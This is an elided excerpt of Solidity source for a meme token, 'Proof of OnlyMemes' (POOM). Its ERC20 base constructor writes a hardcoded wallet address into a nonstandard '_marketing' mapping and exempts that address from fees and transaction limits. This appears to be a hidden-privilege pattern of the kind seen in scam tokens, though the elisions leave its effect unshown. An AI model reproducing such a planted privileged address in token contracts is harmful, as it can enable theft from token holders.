...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
        _marketing[0x2e357b9D66F444b153627F40d49C9749F9b60105] = _marketingwallet;
    }
...
contract POOM is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    constructor() ERC20("Proof of OnlyMemes", "POOM") {
        ...
        excludeFromFees(address(0x2e357b9D66F444b153627F40d49C9749F9b60105), true);
        
        excludeFromMaxTransaction(owner(), true);
        excludeFromMaxTransaction(address(this), true);
        excludeFromMaxTransaction(address(0x2e357b9D66F444b153627F40d49C9749F9b60105), true);
